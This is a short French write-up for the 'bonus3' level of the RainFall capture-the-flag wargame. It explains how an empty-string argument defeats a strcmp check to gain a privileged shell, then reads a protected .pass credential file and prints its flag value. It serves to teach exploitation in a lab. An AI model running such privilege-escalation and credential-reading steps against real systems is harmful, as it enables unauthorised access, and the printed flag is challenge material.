# Bonus 3

```
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 test

bonus3@RainFall:~$ ./bonus3 test test
bonus3@RainFall:~$`
bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 test

bonus3@RainFall:~$ ./bonus3 test test
bonus3@RainFall:~$
```

Le Programme prend 1 argument en parametre.

Le programme lis le fichier .pass et stocke le retour dans local_14.

Si le programme lis bien le fichier et que les parametres sont au nombre de 1, nous entrons dans le "else".

Nous ne pouvons pas effectuer plus de test sur gdb car il n'execute pas le binaire avec les droits superieurs, et donc le programme sort a la condition precedente.

La condition qui nous interesse est strcmp(buffer, argv[1]) == 0.

On constate un peu avant que : buffer[atoi(argv[1])] = 0;

Donc a l'indice de l'adresse buffer, un 0 est mis.

Du coup, si nous donnons une chaine vide en 1er parametre, *buffer vaudra 0 ou '\0' en char.

```
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
bonus3@RainFall:~$ su end
Password:
end@RainFall:~$ cat end
Congratulations graduate!
```